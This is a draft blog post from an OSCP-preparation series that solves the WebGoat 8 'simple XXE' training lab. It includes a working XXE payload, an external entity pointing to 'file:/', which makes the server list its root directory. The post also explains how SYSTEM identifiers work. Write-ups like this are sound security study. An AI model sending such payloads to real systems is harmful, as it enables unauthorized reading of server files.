Title: Road to OSCP: WebGoat XXE challenges
Date: 2020-02-27
Category: OSCP
Tags: websec, webgoat, xxe
Summary: Solutions for WebGoat 8 XXE tasks
Status: draft

#### Intro: simple xxe (as dubbed by authors)  
We should abuse XXE vulnerability to list root directory content on the server.  
The only entry point is a comment field under some poor cat's photo which got a hanger around his neck :)  
Upon clicking on submit button, client app makes a request with `Content-Type` header set to `application/xml`  hencethe request body contain XML payload.  
It's not a sort of convoluted document, just a couple of tags:  
```xml
<?xml version="1.0"?>
<comment>  
  <text>hi there lil cat</text>
</comment>
```


Solution is almost straightforward and based on previous section about XXE:  
```
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY ex SYSTEM "file:/">]>
<comment>
  <text>&ex;</text>
</comment>
```

Result:  
```json
{
  "lessonCompleted" : true,
  "feedback" : "Congratulations. You have successfully completed the assignment.",
  "output" : null,
  "assignment" : "SimpleXXE"
}
```

Here we instruct XML parser to include content of provided SYSTEM identifier that points to root directory.  
It could be assumed that SYSTEM identifier means just an URI to some kind of resource, theoretically it could use  
any scheme such as http or ftp, it our case we need a local directory content hence scheme is `file`.  
Omitted trailing slashes does not seem to have any effect in that case, it will for either with `file:///` or with `file:/`.  
As far as I know one constraint to this kind of identifiers is that they should not contain URI fragments - parts that go after a sharp (#).  
For example `http://foo.bar/?a=b#baz` is fragmented and `http://foo.bar/?a=b` is not.  
